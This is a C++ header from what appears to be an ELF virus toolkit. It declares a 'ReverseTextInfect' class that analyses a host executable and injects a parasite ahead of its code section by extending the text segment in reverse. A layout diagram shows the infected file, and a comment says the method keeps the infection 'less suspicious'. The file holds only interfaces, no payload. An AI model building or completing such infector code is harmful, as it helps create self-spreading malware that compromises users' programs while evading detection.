#pragma once
#include <elf.h>
#include "common/mmap.hh"

namespace vt::infector {
//  host elf structure            infected elf structure
//  -------------------           -----------------------
//  elf_hdr                       elf_hdr
//  phdrs                         phdrs
//  executale_sections            *virus
//  padding                       executale_sections
//  non-exec sections             padding
//  shdrs                         non-exec sections
//                                shdrs
//
//
// The virus will increase file size, but because the entry will still point to
// the .text section (which is extended reversely), it is less suspicious.
//
//  infected elf segments
//  -------------------
//  LOAD RX
//    *virus
//    CODE
//  PADDING
//  LOAD RW
//    .data
//    ...

class ReverseTextInfect {
 public:
  size_t injected_host_size();

  bool analyze(const common::Mmap<PROT_READ>& host_mapping,
               const common::Mmap<PROT_READ>& parasite_mapping);

  bool inject(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
              common::Mmap<PROT_READ> parasite_mapping);

 private:
  size_t host_size_;
  size_t parasite_size_;
  Elf64_Addr original_e_entry_;
  Elf64_Addr original_code_segment_p_vaddr_;
  Elf64_Off original_code_segment_file_offset_;
  size_t code_segment_idx_;
};

}  // namespace vt::infector